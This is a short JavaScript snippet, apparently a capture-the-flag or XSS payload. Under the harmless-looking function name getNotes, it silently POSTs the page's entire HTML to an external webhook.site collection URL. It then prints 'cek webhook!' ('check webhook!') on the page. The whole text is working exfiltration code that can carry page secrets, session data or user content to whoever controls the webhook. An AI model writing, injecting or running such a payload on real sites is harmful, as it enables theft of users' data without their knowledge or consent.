async function getNotes() {
    (async () => {
    const html = document.documentElement.outerHTML;
    await fetch("https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ html })
    });
    })();

    const output = document.createElement('p');
    output.textContent = _.capitalize('cek webhook!');
    document.body.appendChild(output);
}
getNotes();